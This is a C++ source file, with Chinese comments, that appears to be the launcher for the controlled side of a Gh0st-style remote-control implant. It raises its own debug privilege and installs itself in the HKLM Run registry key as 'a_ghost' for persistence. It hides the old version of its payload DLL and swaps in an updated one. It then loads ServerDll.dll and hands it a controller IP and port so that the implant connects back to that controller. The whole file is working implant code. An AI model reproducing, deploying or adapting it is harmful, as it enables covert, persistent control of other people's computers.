#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <corecrt_io.h>
#include "common/commands.h"

// 自动启动注册表中的值
#define REG_NAME "a_ghost"

typedef void (*StopRun)();

typedef bool (*IsStoped)();

typedef BOOL (*IsExit)();

// 停止程序运行
StopRun stop = NULL;

// 是否成功停止
IsStoped bStop = NULL;

// 是否退出被控端
IsExit bExit = NULL;

BOOL status = 0;

CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "", 0, CLIENT_TYPE_DLL };

//提升权限
void DebugPrivilege()
{
	HANDLE hToken = NULL;
	//打开当前进程的访问令牌
	int hRet = OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken);

	if( hRet)
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		//取得描述权限的LUID
		LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		//调整访问令牌的权限
		AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(tp),NULL,NULL);

		CloseHandle(hToken);
	}
}

/** 
* @brief 设置本身开机自启动
* @param[in] *sPath 注册表的路径
* @param[in] *sNmae 注册表项名称
* @return 返回注册结果
* @details Win7 64位机器上测试结果表明，注册项在：\n
* HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
* @note 首次运行需要以管理员权限运行，才能向注册表写入开机启动项
*/
BOOL SetSelfStart(const char *sPath, const char *sNmae)
{
	DebugPrivilege();

	// 写入的注册表路径
#define REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"

	// 在注册表中写入启动信息
	HKEY hKey = NULL;
	LONG lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);

	// 判断是否成功
	if(lRet != ERROR_SUCCESS)
		return FALSE;

	lRet = RegSetValueExA(hKey, sNmae, 0, REG_SZ, (const BYTE*)sPath, strlen(sPath) + 1);

	// 关闭注册表
	RegCloseKey(hKey);

	// 判断是否成功
	return lRet == ERROR_SUCCESS;
}

BOOL CALLBACK callback(DWORD CtrlType)
{
	if (CtrlType == CTRL_CLOSE_EVENT)
	{
		status = 1;
		if(stop) stop();
		while(1==status)
			Sleep(20);
	}
	return TRUE;
}

// 运行程序.
BOOL Run(const char* argv1, int argv2);

// @brief 首先读取settings.ini配置文件，获取IP和端口.
// [settings] 
// localIp=XXX
// ghost=6688
// 如果配置文件不存在就从命令行中获取IP和端口.
int main(int argc, const char *argv[])
{
	if(!SetSelfStart(argv[0], REG_NAME))
	{
		std::cout<<"设置开机自启动失败，请用管理员权限运行.\n";
	}
	status = 0;
	SetConsoleCtrlHandler(&callback, TRUE);

	do {
		BOOL ret = Run(argc > 1 ? argv[1] : (strlen(g_ConnectAddress.ServerIP()) == 0 ? "127.0.0.1" : g_ConnectAddress.ServerIP()),
			argc > 2 ? atoi(argv[2]) : (g_ConnectAddress.ServerPort() == 0 ? 6543 : g_ConnectAddress.ServerPort()));
		if (ret == 1) {
			return -1;
		}
	} while (status == 0);

	status = 0;
	return -1;
}

// 传入命令行参数: IP 和 端口.
BOOL Run(const char* argv1, int argv2) {
	BOOL result = FALSE;
	char path[_MAX_PATH], * p = path;
	GetModuleFileNameA(NULL, path, sizeof(path));
	while (*p) ++p;
	while ('\\' != *p) --p;
	*(p + 1) = 0;
	std::string folder = path;
	std::string oldFile = folder + "ServerDll.old";
	std::string newFile = folder + "ServerDll.new";
	strcpy(p + 1, "ServerDll.dll");
	BOOL ok = TRUE;
	if (_access(newFile.c_str(), 0) != -1) {
		if (_access(oldFile.c_str(), 0) != -1)
		{
			if (!DeleteFileA(oldFile.c_str()))
			{
				std::cerr << "Error deleting file. Error code: " << GetLastError() << std::endl;
				ok = FALSE;
			}
		}
		if (ok && !MoveFileA(path, oldFile.c_str())) {
			std::cerr << "Error removing file. Error code: " << GetLastError() << std::endl;
			ok = FALSE;
		}else {
			// 设置文件属性为隐藏
			if (SetFileAttributesA(oldFile.c_str(), FILE_ATTRIBUTE_HIDDEN))
			{
				std::cout << "File created and set to hidden: " << oldFile << std::endl;
			}
		}
		if (ok && !MoveFileA(newFile.c_str(), path)) {
			std::cerr << "Error removing file. Error code: " << GetLastError() << std::endl;
			MoveFileA(oldFile.c_str(), path);// recover
		}else if (ok){
			std::cout << "Using new file: " << newFile << std::endl;
		}
	}
	HMODULE hDll = LoadLibraryA(path);
	typedef void (*TestRun)(char* strHost, int nPort);
	TestRun run = hDll ? TestRun(GetProcAddress(hDll, "TestRun")) : NULL;
	stop = hDll ? StopRun(GetProcAddress(hDll, "StopRun")) : NULL;
	bStop = hDll ? IsStoped(GetProcAddress(hDll, "IsStoped")) : NULL;
	bExit = hDll ? IsExit(GetProcAddress(hDll, "IsExit")) : NULL;
	if (run)
	{
		char ip[_MAX_PATH];
		strcpy_s(ip, g_ConnectAddress.ServerIP());
		int port = g_ConnectAddress.ServerPort();
		strcpy(p + 1, "settings.ini");
		if (_access(path, 0) == -1) { // 文件不存在: 优先从参数中取值，其次是从g_ConnectAddress取值.
			strcpy(ip, argv1);
			port = argv2;
		}
		else {
			GetPrivateProfileStringA("settings", "localIp", g_ConnectAddress.ServerIP(), ip, _MAX_PATH, path);
			port = GetPrivateProfileIntA("settings", "ghost", g_ConnectAddress.ServerPort(), path);
		}
		printf("[server] %s:%d\n", ip, port);
		do
		{
			run(ip, port);
			while (bStop && !bStop() && 0 == status)
				Sleep(20);
		} while (bExit && !bExit() && 0 == status);

		while (bStop && !bStop() && 1 == status)
			Sleep(20);
		if (bExit) {
			result = bExit();
		}
		if (!FreeLibrary(hDll)) {
			printf("释放动态链接库\"ServerDll.dll\"失败. 错误代码: %d\n", GetLastError());
		}
		else {
			printf("释放动态链接库\"ServerDll.dll\"成功!\n");
		}
	}
	else {
		printf("加载动态链接库\"ServerDll.dll\"失败. 错误代码: %d\n", GetLastError());
		Sleep(3000);
	}
	return result;
}